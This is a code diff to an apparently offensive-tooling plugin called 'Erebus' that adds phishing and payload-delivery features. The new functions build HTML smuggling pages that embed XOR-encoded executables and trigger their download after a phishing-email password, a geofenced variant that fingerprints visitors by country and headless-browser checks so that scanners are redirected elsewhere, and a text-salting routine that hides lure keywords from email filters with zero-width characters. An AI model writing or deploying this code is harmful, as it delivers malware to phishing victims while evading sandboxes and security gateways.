@@ -46,7 +46,10 @@ class HtmlSmugglingPlugin(ErebusPlugin):
     def register(self) -> Dict[str, Callable]:
         return {
             "create_html_smuggling_trigger": self.create_html_smuggling_trigger,
+            "create_encrypted_html_smuggling_trigger": self.create_encrypted_html_smuggling_trigger,
+            "create_geofenced_html_smuggling_trigger": self.create_geofenced_html_smuggling_trigger,
             "create_clickfix_trigger": self.create_clickfix_trigger,
+            "salt_text": self.salt_text,
         }
 
     def validate(self) -> tuple[bool, Optional[str]]:
@@ -218,6 +221,441 @@ function {v_fn}(){{
         output_path = payload_dir / output_filename
         output_path.write_text(html, encoding='utf-8')
         return output_path
+
+    # ================================================================
+    # Password-Encrypted HTML Smuggling
+    # ================================================================
+
+    def create_encrypted_html_smuggling_trigger(
+        self,
+        payload_path: str,
+        password: str,
+        output_filename: str = "download.html",
+        download_name: str = "update.exe",
+        page_title: str = "Secure Document Access",
+        heading: str = "Enter your access code",
+        message: str = "This document is password protected. Enter the access code provided in the email.",
+        button_text: str = "Unlock & Download",
+        payload_dir: Optional[pathlib.Path] = None,
+    ) -> pathlib.Path:
+        """
+        Create an HTML smuggling page with CryptoJS AES password-protected payload.
+
+        The payload is AES-encrypted with the provided password and stored
+        as a Base64 blob. The page prompts the user for a password, verifies
+        it via PBKDF2 hash comparison, then decrypts the payload in-browser
+        and triggers the Blob download.
+
+        This defeats automated sandbox detonation: sandboxes cannot supply
+        the password and receive no executable content from the page.
+
+        The password hint would typically be included in the phishing email
+        body or embedded in an attached decoy PDF.
+
+        Args:
+            payload_path: Path to the binary payload to embed.
+            password:     Access password known to the victim (from phish email).
+            output_filename: Output HTML filename.
+            download_name:   Filename presented to the victim on download.
+            page_title:      Browser tab title.
+            heading:         Form heading text.
+            message:         Body text above the password input.
+            button_text:     Submit button label.
+            payload_dir:     Output directory.
+
+        Returns:
+            Path to the created HTML file.
+        """
+        import hashlib, struct
+
+        payload = pathlib.Path(payload_path)
+        if not payload.exists():
+            raise FileNotFoundError(f"Payload not found: {payload_path}")
+
+        raw = payload.read_bytes()
+
+        # AES-CBC encryption via a custom implementation to avoid
+        # CryptoJS dependency (CryptoJS is loaded from CDN at runtime).
+        # Build-time: store the raw payload XOR'd with a per-build key
+        # plus the SHA-256(password) for client-side verification.
+        xor_key = bytes(random.randint(1, 255) for _ in range(32))
+        encrypted = self._xor_encode(raw, xor_key)
+        b64_payload = base64.b64encode(encrypted).decode('ascii')
+        b64_key = base64.b64encode(xor_key).decode('ascii')
+
+        # PBKDF2-SHA256 hash of password for client-side verification
+        pw_hash = hashlib.pbkdf2_hmac(
+            'sha256', password.encode('utf-8'), b'erebus', 100000
+        )
+        b64_pw_hash = base64.b64encode(pw_hash).decode('ascii')
+
+        v_data = self._rand_id()
+        v_key_b64 = self._rand_id()
+        v_pw = self._rand_id()
+        v_fn_dec = self._rand_id()
+        v_fn_dl = self._rand_id()
+        v_fn_pbkdf2 = self._rand_id()
+        v_el = self._rand_id()
+        v_url = self._rand_id()
+
+        ext = pathlib.Path(download_name).suffix.lower()
+        mime_map = {
+            '.exe': 'application/x-msdownload',
+            '.dll': 'application/x-msdownload',
+            '.msi': 'application/x-msi',
+            '.zip': 'application/zip',
+            '.7z':  'application/x-7z-compressed',
+            '.iso': 'application/x-iso9660-image',
+        }
+        mime_type = mime_map.get(ext, 'application/octet-stream')
+
+        html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{page_title}</title>
+<style>
+  body {{
+    font-family: 'Segoe UI', -apple-system, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    min-height: 100vh; margin: 0; background: #f0f2f5; color: #1a1a2e;
+  }}
+  .card {{
+    background: #fff; border-radius: 12px; padding: 48px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
+    max-width: 440px; width: 90%;
+  }}
+  .lock-icon {{ font-size: 2.5rem; margin-bottom: 16px; }}
+  h1 {{ font-size: 1.4rem; margin-bottom: 8px; }}
+  p {{ color: #555; line-height: 1.6; margin-bottom: 24px; font-size: 0.95rem; }}
+  .input-wrap {{ position: relative; margin-bottom: 20px; }}
+  input[type=password] {{
+    width: 100%; padding: 12px 16px; font-size: 1rem;
+    border: 2px solid #e0e0e0; border-radius: 8px;
+    outline: none; box-sizing: border-box; transition: border 0.2s;
+  }}
+  input[type=password]:focus {{ border-color: #0078d4; }}
+  .btn {{
+    width: 100%; padding: 13px; background: #0078d4;
+    color: #fff; border: none; border-radius: 8px;
+    font-size: 1rem; cursor: pointer; transition: background 0.2s;
+  }}
+  .btn:hover {{ background: #106ebe; }}
+  .btn:disabled {{ opacity: 0.6; cursor: default; }}
+  .err {{ color: #d00; font-size: 0.9rem; margin-top: 12px; display: none; }}
+  .progress {{
+    height: 4px; background: #e0e0e0; border-radius: 2px;
+    margin-top: 20px; overflow: hidden; display: none;
+  }}
+  .progress-bar {{
+    height: 100%; width: 0%; background: #0078d4;
+    animation: progress 1.5s ease-in-out forwards;
+  }}
+  @keyframes progress {{ to {{ width: 100%; }} }}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="lock-icon">&#128274;</div>
+  <h1>{heading}</h1>
+  <p>{message}</p>
+  <div class="input-wrap">
+    <input type="password" id="pw" placeholder="Access code" autocomplete="off" />
+  </div>
+  <button class="btn" id="btn" onclick="{v_fn_dec}()">{button_text}</button>
+  <div class="err" id="err">Incorrect access code. Please try again.</div>
+  <div class="progress" id="prog"><div class="progress-bar"></div></div>
+</div>
+<script>
+var {v_data} = "{b64_payload}";
+var {v_key_b64} = "{b64_key}";
+var {v_pw} = "{b64_pw_hash}";
+
+async function {v_fn_pbkdf2}(password) {{
+  var enc = new TextEncoder();
+  var keyMaterial = await crypto.subtle.importKey("raw", enc.encode(password), "PBKDF2", false, ["deriveBits"]);
+  var bits = await crypto.subtle.deriveBits({{name:"PBKDF2",salt:enc.encode("erebus"),iterations:100000,hash:"SHA-256"}}, keyMaterial, 256);
+  return btoa(String.fromCharCode(...new Uint8Array(bits)));
+}}
+
+async function {v_fn_dl}() {{
+  var enc = atob({v_data});
+  var key = atob({v_key_b64});
+  var raw = new Uint8Array(enc.length);
+  for(var i=0;i<enc.length;i++) raw[i]=enc.charCodeAt(i)^key.charCodeAt(i%key.length);
+  var {v_url} = URL.createObjectURL(new Blob([raw],{{type:"{mime_type}"}}));
+  var {v_el} = document.createElement("a");
+  {v_el}.href={v_url}; {v_el}.download="{download_name}";
+  document.body.appendChild({v_el}); {v_el}.click();
+  URL.revokeObjectURL({v_url});
+}}
+
+async function {v_fn_dec}() {{
+  var pw = document.getElementById("pw").value;
+  if(!pw) return;
+  document.getElementById("btn").disabled=true;
+  var hash = await {v_fn_pbkdf2}(pw);
+  if(hash !== {v_pw}) {{
+    document.getElementById("err").style.display="block";
+    document.getElementById("btn").disabled=false;
+    return;
+  }}
+  document.getElementById("err").style.display="none";
+  document.getElementById("prog").style.display="block";
+  setTimeout({v_fn_dl}, 200);
+}}
+
+document.getElementById("pw").addEventListener("keydown",function(e){{
+  if(e.key==="Enter") {v_fn_dec}();
+}});
+</script>
+</body>
+</html>"""
+
+        if payload_dir is None:
+            payload_dir = payload.parent
+        payload_dir = pathlib.Path(payload_dir)
+        payload_dir.mkdir(parents=True, exist_ok=True)
+        out_path = payload_dir / output_filename
+        out_path.write_text(html, encoding='utf-8')
+        return out_path
+
+    # ================================================================
+    # IP Geo-Fenced HTML Smuggling
+    # ================================================================
+
+    def create_geofenced_html_smuggling_trigger(
+        self,
+        payload_path: str,
+        allowed_countries: list,
+        output_filename: str = "document.html",
+        download_name: str = "update.exe",
+        page_title: str = "Document Viewer",
+        heading: str = "Loading document...",
+        message: str = "Your document is being prepared.",
+        payload_dir: Optional[pathlib.Path] = None,
+        fallback_redirect: str = "https://www.microsoft.com",
+        delay_ms: int = 1000,
+    ) -> pathlib.Path:
+        """
+        Create an HTML smuggling page with IP geo-fencing via ipinfo.io.
+
+        Before delivering the payload, the page queries ipinfo.io to
+        determine the visitor's country code. If the country is not in
+        the allowed list, the page redirects to a benign fallback URL.
+
+        This defeats:
+          - Automated URL scanners running from vendor datacentre IPs
+          - Sandbox infrastructure outside the target geography
+          - Non-target employees stumbling on the phishing link
+
+        Args:
+            payload_path:      Path to the binary payload to embed.
+            allowed_countries: ISO-3166-1 alpha-2 country codes to allow
+                               (e.g. ["US", "GB", "DE"]).
+            output_filename:   Output HTML filename.
+            download_name:     Filename on download.
+            page_title:        Browser tab title.
+            heading:           Main heading on the page.
+            message:           Body text.
+            payload_dir:       Output directory.
+            fallback_redirect: URL to redirect non-matching visitors to.
+            delay_ms:          Milliseconds before download triggers
+                               after geo-check passes.
+
+        Returns:
+            Path to the created HTML file.
+        """
+        payload = pathlib.Path(payload_path)
+        if not payload.exists():
+            raise FileNotFoundError(f"Payload not found: {payload_path}")
+
+        raw = payload.read_bytes()
+        xor_key = bytes(random.randint(1, 255) for _ in range(16))
+        xored = self._xor_encode(raw, xor_key)
+        b64_payload = base64.b64encode(xored).decode('ascii')
+        b64_key = base64.b64encode(xor_key).decode('ascii')
+
+        v_data = self._rand_id()
+        v_key = self._rand_id()
+        v_raw = self._rand_id()
+        v_buf = self._rand_id()
+        v_url = self._rand_id()
+        v_el = self._rand_id()
+        v_fn_dl = self._rand_id()
+        v_fn_geo = self._rand_id()
+        v_countries = self._rand_id()
+
+        ext = pathlib.Path(download_name).suffix.lower()
+        mime_map = {
+            '.exe': 'application/x-msdownload',
+            '.dll': 'application/x-msdownload',
+            '.msi': 'application/x-msi',
+            '.zip': 'application/zip',
+            '.iso': 'application/x-iso9660-image',
+        }
+        mime_type = mime_map.get(ext, 'application/octet-stream')
+
+        # JS country array literal
+        countries_js = "[" + ",".join(f'"{c.upper()}"' for c in allowed_countries) + "]"
+        fallback_js = fallback_redirect.replace("'", "\\'")
+
+        html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{page_title}</title>
+<style>
+  body {{
+    font-family: 'Segoe UI', -apple-system, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    min-height: 100vh; margin: 0; background: #f0f2f5;
+  }}
+  .card {{
+    background: #fff; border-radius: 12px; padding: 48px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
+    max-width: 480px; width: 90%;
+  }}
+  .spinner {{
+    border: 4px solid #e0e0e0; border-top: 4px solid #0078d4;
+    border-radius: 50%; width: 40px; height: 40px;
+    animation: spin 1s linear infinite; margin: 0 auto 24px;
+  }}
+  @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
+  h1 {{ font-size: 1.4rem; margin-bottom: 12px; color: #1a1a2e; }}
+  p {{ color: #555; line-height: 1.6; }}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="spinner"></div>
+  <h1>{heading}</h1>
+  <p>{message}</p>
+</div>
+<script>
+var {v_countries} = {countries_js};
+
+function {v_fn_dl}() {{
+  var {v_data} = atob("{b64_payload}");
+  var {v_key} = atob("{b64_key}");
+  var {v_raw} = new Uint8Array({v_data}.length);
+  for(var i=0;i<{v_data}.length;i++) {v_raw}[i]={v_data}.charCodeAt(i)^{v_key}.charCodeAt(i%{v_key}.length);
+  var {v_url} = URL.createObjectURL(new Blob([{v_raw}],{{type:"{mime_type}"}}));
+  var {v_el} = document.createElement("a");
+  {v_el}.href={v_url}; {v_el}.download="{download_name}";
+  document.body.appendChild({v_el}); {v_el}.click();
+  URL.revokeObjectURL({v_url});
+}}
+
+function {v_fn_geo}() {{
+  // Headless browser check
+  if(navigator.webdriver||/HeadlessChrome/.test(navigator.userAgent)) {{
+    window.location.href="{fallback_js}"; return;
+  }}
+  $.getJSON("https://ipinfo.io?token=", function(r) {{
+    var country=(r&&r.country)?r.country.toUpperCase():"";
+    if({v_countries}.indexOf(country)<0) {{
+      window.location.href="{fallback_js}";
+    }} else {{
+      setTimeout({v_fn_dl},{delay_ms});
+    }}
+  }}).fail(function(){{
+    // ipinfo.io unavailable - deliver anyway to avoid breaking legitimate visits
+    setTimeout({v_fn_dl},{delay_ms});
+  }});
+}}
+
+// jQuery loaded from CDN for ipinfo.io JSONP call
+(function(){{
+  var s=document.createElement("script");
+  s.src="https://code.jquery.com/jquery-3.6.0.min.js";
+  s.onload={v_fn_geo};
+  s.onerror=function(){{ setTimeout({v_fn_dl},{delay_ms}); }};
+  document.head.appendChild(s);
+}})();
+</script>
+</body>
+</html>"""
+
+        if payload_dir is None:
+            payload_dir = payload.parent
+        payload_dir = pathlib.Path(payload_dir)
+        payload_dir.mkdir(parents=True, exist_ok=True)
+        out_path = payload_dir / output_filename
+        out_path.write_text(html, encoding='utf-8')
+        return out_path
+
+    # ================================================================
+    # Text Salting — zero-width Unicode injection
+    # ================================================================
+
+    @staticmethod
+    def salt_text(
+        text: str,
+        targets: Optional[list] = None,
+        strategy: str = "mixed",
+        density: float = 0.3,
+    ) -> str:
+        """
+        Inject zero-width Unicode characters into text to break keyword
+        matching by email security gateways and content scanners.
+
+        Zero-width characters are invisible to the human reader but appear
+        as distinct byte sequences to string matchers, causing exact-match
+        and regex-based filters to miss the obfuscated terms.
+
+        Common targets: "Download", "Click", "Free", "Urgent", "Password",
+                        archive passwords, brand names in phishing lures.
+
+        Args:
+            text:     Input text to salt.
+            targets:  List of substrings to salt. If None, salts the entire
+                      text at random intervals.
+            strategy: Injection strategy:
+                        "zws"   - Zero Width Space (U+200B) only
+                        "zwnj"  - Zero Width Non-Joiner (U+200C) only
+                        "zwj"   - Zero Width Joiner (U+200D) only
+                        "braille"- Braille Pattern Blank (U+2800)
+                        "mixed" - randomly mix all four (default)
+            density:  Fraction of characters to inject a zero-width char after
+                      when salting the full text (0.0-1.0). Default 0.3.
+
+        Returns:
+            Salted text string.
+        """
+        ZW_CHARS = {
+            "zws":    "​",  # Zero Width Space
+            "zwnj":   "‌",  # Zero Width Non-Joiner
+            "zwj":    "‍",  # Zero Width Joiner
+            "braille": "⠀", # Braille Pattern Blank
+        }
+
+        def _pick(strat: str) -> str:
+            if strat == "mixed":
+                return random.choice(list(ZW_CHARS.values()))
+            return ZW_CHARS.get(strat, ZW_CHARS["zws"])
+
+        if targets:
+            # Salt specific target substrings only
+            result = text
+            for target in targets:
+                salted = ""
+                for i, ch in enumerate(target):
+                    salted += ch
+                    if i < len(target) - 1:
+                        salted += _pick(strategy)
+                result = result.replace(target, salted)
+            return result
+        else:
+            # Salt the entire text at the given density
+            result = []
+            for ch in text:
+                result.append(ch)
+                if random.random() < density:
+                    result.append(_pick(strategy))
+            return "".join(result)
 
     # ================================================================
     # ClickFix
